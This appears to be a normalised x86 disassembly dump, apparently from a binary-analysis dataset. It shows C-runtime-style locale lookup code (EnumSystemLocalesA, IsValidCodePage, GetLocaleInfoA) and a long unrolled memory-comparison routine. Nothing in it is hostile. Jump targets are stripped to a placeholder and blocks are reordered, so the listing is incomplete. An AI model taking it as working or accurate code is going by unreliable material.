sub eax 0x3
neg eax
sbb eax eax
inc eax
mov [ esi + 0x10 ] eax
call sub_41d120
sub eax 0x3
neg eax
sbb eax eax
and [ esi + 0x18 ] 0x0
inc eax
cmp [ esi + 0x10 ] 0x0
pop ecx
pop ecx
mov [ esi + 0x14 ] eax
je r-xdata
mov edx [ esi ]
call sub_425460
push 0x2
pop eax
jmp r-xdata
and [ esi + 0x8 ] 0x0
test eax 0x200
je r-xdata
push 0x1
push sub_42557d
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
mov eax [ esi + 0x8 ]
test eax 0x100
je r-xdata
test al 0x7
jne r-xdata
retn
sub_425875
push [ esi ]
call sub_41d120
sub eax 0x3
neg eax
sbb eax eax
inc eax
pop ecx
mov [ esi + 0x10 ] eax
je r-xdata
mov edx [ esi ]
call sub_425460
push 0x2
pop eax
jmp r-xdata
retn
and [ esi + 0x8 ] 0x0
push 0x1
push sub_42574e
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
sub_4258b1
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_41e872
lea edi [ eax + 0x9c ]
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov [ edi ] eax
add eax 0x40
lea ebx [ edi + 0x4 ]
mov [ ebx ] eax
je r-xdata
or [ edi + 0x8 ] 0x104
jmp r-xdata
mov eax [ edi ]
and [ edi + 0x8 ] 0x0
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
call [ GetUserDefaultLCID@IAT ]
mov [ edi + 0x18 ] eax
mov [ edi + 0x1c ] eax
mov ebx [ ebx ]
test ebx ebx
je r-xdata
cmp [ eax ] 0x0
je r-xdata
push ebx
push 0x16
push r--data
call sub_425324
add esp 0xc
xor eax eax
mov esi [ ebp + 0x8 ]
mov eax esi
sub eax 0xffffff80
neg esi
sbb esi esi
and esi eax
call sub_425386
mov esi eax
mov [ ebp + 0x8 ] esi
test esi esi
je r-xdata
mov [ edi + 0x8 ] 0x104
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
cmp esi 0xfde8
je r-xdata
push ebx
call sub_41d120
sub eax 0x3
neg eax
pop ecx
sbb eax eax
push 0x1
inc eax
push sub_42547b
mov [ edi + 0x14 ] eax
call [ EnumSystemLocalesA@IAT ]
test [ edi + 0x8 ] 0x4
jne r-xdata
mov esi edi
call sub_425875
cmp [ eax ] 0x0
je r-xdata
cmp esi 0xfde9
je r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
and [ edi + 0x8 ] 0x0
jmp r-xdata
push edi
push 0x40
push r--data
call sub_425324
add esp 0xc
test eax eax
je r-xdata
mov esi edi
call sub_42580e
jmp r-xdata
movzx eax si
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
je r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
push 0x1
push [ edi + 0x18 ]
call [ IsValidLocale@IAT ]
test eax eax
je r-xdata
mov esi edi
call sub_425875
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov esi edi
call sub_42580e
jmp r-xdata
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov cx [ edi + 0x18 ]
mov [ eax ] cx
mov cx [ edi + 0x1c ]
mov [ eax + 0x2 ] cx
mov [ eax + 0x4 ] si
xor eax eax
inc eax
jmp r-xdata
mov esi [ GetLocaleInfoA@IAT ]
mov ecx 0x814
cmp [ eax ] cx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0x40
push ebx
push 0x1001
push [ edi + 0x18 ]
call esi
test eax eax
je r-xdata
push r--data
push 0x40
push ebx
call sub_41e063
add esp 0xc
test eax eax
je r-xdata
push 0x40
lea eax [ ebx + 0x40 ]
push eax
push 0x1002
push [ edi + 0x1c ]
call esi
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_41ef83
push 0xa
push 0x10
sub ebx 0xffffff80
push ebx
push [ ebp + 0x8 ]
call sub_41dfe5
add esp 0x10
sub_425aa2
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
mov eax edi
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
jmp r-xdata
dec eax
je r-xdata
sub eax ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebp
retn
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
movzx eax [ ecx + 0x1 ]
movzx ecx [ esi + 0x1 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push 0x20
pop edx
jmp r-xdata
movzx eax [ ecx + 0x2 ]
movzx ecx [ esi + 0x2 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
cmp edi edx
jae r-xdata
movzx eax [ ecx + 0x2 ]
movzx edx [ esi + 0x2 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov esi [ eax ]
cmp esi [ ecx ]
je r-xdata
add eax edi
add ecx edi
cmp edi 0x1f
ja r-xdata
movzx eax [ ecx + 0x3 ]
movzx ecx [ esi + 0x3 ]
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
xor esi esi
movzx esi [ eax ]
movzx ebx [ ecx ]
sub esi ebx
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_426f76 ]
mov eax esi
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp esi [ ecx + 0x4 ]
je r-xdata
movzx esi [ eax + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
mov edx [ eax - 0x1c ]
cmp edx [ ecx - 0x1c ]
je r-xdata
mov edx [ eax - 0x18 ]
cmp edx [ ecx - 0x18 ]
je r-xdata
mov edx [ eax - 0x14 ]
cmp edx [ ecx - 0x14 ]
je r-xdata
mov edx [ eax - 0x10 ]
cmp edx [ ecx - 0x10 ]
je r-xdata
mov edx [ eax - 0xc ]
cmp edx [ ecx - 0xc ]
je r-xdata
mov edx [ eax - 0x8 ]
cmp edx [ ecx - 0x8 ]
je r-xdata
mov edx [ eax - 0x4 ]
cmp edx [ ecx - 0x4 ]
je r-xdata
mov edx [ eax - 0x1d ]
cmp edx [ ecx - 0x1d ]
je r-xdata
mov edx [ eax - 0x19 ]
cmp edx [ ecx - 0x19 ]
je r-xdata
mov edx [ eax - 0x15 ]
cmp edx [ ecx - 0x15 ]
je r-xdata
mov edx [ eax - 0x11 ]
cmp edx [ ecx - 0x11 ]
je r-xdata
mov edx [ eax - 0xd ]
cmp edx [ ecx - 0xd ]
je r-xdata
mov edx [ eax - 0x9 ]
cmp edx [ ecx - 0x9 ]
je r-xdata
mov edx [ eax - 0x5 ]
cmp edx [ ecx - 0x5 ]
je r-xdata
movzx ecx [ ecx - 0x1 ]
movzx eax [ eax - 0x1 ]
sub eax ecx
je r-xdata
mov edx [ eax - 0x1e ]
cmp edx [ ecx - 0x1e ]
je r-xdata
mov edx [ eax - 0x1a ]
cmp edx [ ecx - 0x1a ]
je r-xdata
mov edx [ eax - 0x16 ]
cmp edx [ ecx - 0x16 ]
je r-xdata
mov edx [ eax - 0x12 ]
cmp edx [ ecx - 0x12 ]
je r-xdata
mov edx [ eax - 0xe ]
cmp edx [ ecx - 0xe ]
je r-xdata
mov edx [ eax - 0xa ]
cmp edx [ ecx - 0xa ]
je r-xdata
mov edx [ eax - 0x6 ]
cmp edx [ ecx - 0x6 ]
je r-xdata
mov dx [ eax - 0x2 ]
cmp dx [ ecx - 0x2 ]
je r-xdata
mov edx [ eax - 0x1f ]
cmp edx [ ecx - 0x1f ]
je r-xdata
mov edx [ eax - 0x1b ]
cmp edx [ ecx - 0x1b ]
je r-xdata
mov edx [ eax - 0x17 ]
cmp edx [ ecx - 0x17 ]
je r-xdata
mov edx [ eax - 0x13 ]
cmp edx [ ecx - 0x13 ]
je r-xdata
mov edx [ eax - 0xf ]
cmp edx [ ecx - 0xf ]
je r-xdata
mov edx [ eax - 0xb ]
cmp edx [ ecx - 0xb ]
je r-xdata
mov edx [ eax - 0x7 ]
cmp edx [ ecx - 0x7 ]
je r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
pop ebx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x4 ]
movzx ebx [ ecx + 0x4 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xc ]
movzx esi [ eax - 0xc ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor eax eax
movzx esi dl
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xa ]
movzx esi [ eax - 0xa ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
movzx edx [ ecx - 0x2 ]
movzx esi [ eax - 0x2 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x1f ]
movzx esi [ eax - 0x1f ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xf ]
movzx esi [ eax - 0xf ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
mov esi [ eax + 0x8 ]
cmp esi [ ecx + 0x8 ]
je r-xdata
movzx esi [ eax + 0x5 ]
movzx ebx [ ecx + 0x5 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x3 ]
movzx ebx [ ecx + 0x3 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1e ]
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
mov eax edx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x8 ]
movzx ebx [ ecx + 0x8 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x6 ]
movzx ebx [ ecx + 0x6 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
mov eax edx
jmp r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x8 ]
movzx esi [ eax - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
jmp r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
mov esi [ eax + 0xc ]
cmp esi [ ecx + 0xc ]
je r-xdata
movzx esi [ eax + 0x9 ]
movzx ebx [ ecx + 0x9 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x7 ]
movzx ebx [ ecx + 0x7 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
sub eax ecx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
test eax eax
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
